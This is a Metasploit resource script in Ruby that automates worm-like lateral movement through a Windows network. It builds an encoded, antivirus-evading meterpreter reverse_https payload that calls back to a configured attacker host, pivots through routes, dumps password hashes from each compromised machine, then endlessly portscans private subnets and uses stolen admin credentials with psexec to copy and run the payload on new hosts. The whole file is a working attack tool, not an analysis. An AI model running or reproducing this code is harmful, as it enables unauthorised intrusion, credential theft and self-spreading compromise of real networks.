<ruby>
require "csv"
require "yaml"
config = YAML.load_file("config.yml")
run_single("chmod +x msfundetect")
run_single("msfpayload windows/meterpreter/reverse_https lhost=#{config["lhost"]} lport=443 r | msfencode -e x86/alpha_mixed bufferregister=eax -t raw | #{Dir.pwd}/msfundetect -t x > x.exe")
open("#{config["msfdir"]}/scripts/meterpreter/autoroute2.rb", "wb").write(%Q*client.net.config.each_route{|i| Rex::Socket::SwitchBoard.add_route(i.subnet, i.netmask, client) unless (i.subnet =~ /^(224\.|127\.)/ || i.subnet == "0.0.0.0" || i.netmask == "255.255.255.255")}*)
run_single("hosts -d")
run_single("creds -d")
run_single("setg service_filename demo")
run_single(%Q|setg autorunscript multi_console_command -cl '"run autoroute2","upload x.exe c:","run post/windows/gather/smart_hashdump getsystem=true"'|)
run_single("setg ExitOnSession false")
run_single("use exploit/multi/handler")
run_single("setg payload windows/meterpreter/reverse_https")
run_single("setg lhost #{config["lhost"]}")
run_single("setg lport 443")
run_single("exploit -j -z")
run_single("setg disablepayloadhandler true")
run_single("setg ports 445")
run_single("setg threads 15")
run_single("setg share 'admin$'")
run_single("setg command 'c:\\x.exe'")

def spread(p_c_ip, p_c_use)
        CSV.foreach("jj.txt") do |d|
                if !framework.sessions.any?{|s| s.to_s[p_c_ip]} && d[2].downcase[/adm/] then
                        run_single("setg smbuser #{d[2]}")
                        run_single("setg smbpass #{d[3]}")
                        run_single(p_c_use)
                        run_single("set rhost #{p_c_ip}")
                        run_single("set rhosts #{p_c_ip}")
                        run_single("exploit")
                end
        end
end

Thread.new do
        while 1 == 1 do
                framework.db.hosts.each do |m|
                        if g = m.address[/(192|10)[.]\w+[.]\w+[.]/] then
                                run_single("use auxiliary/scanner/portscan/tcp")
                                run_single("set rhosts #{g}0/24")
                                run_single("exploit")
                                framework.db.hosts.each do |i|
                                        i = i.address
                                        if (config["rhosts"].nil? || config["rhosts"] =~ i) && (config["maxhosts"].nil? || config["maxhosts"] < framework.sessions.count) then
                                                run_single("creds -o jj.txt")
                                                run_single(%Q|sessions -c 'cmd /c "copy c:\\x.exe \\\\#{i}\\c"'|)
                                                spread(i, "use auxiliary/admin/smb/psexec_command")
                                                spread(i, "use exploit/windows/smb/psexec")
                                        end
                                end
                        end
                end
        end
end
</ruby>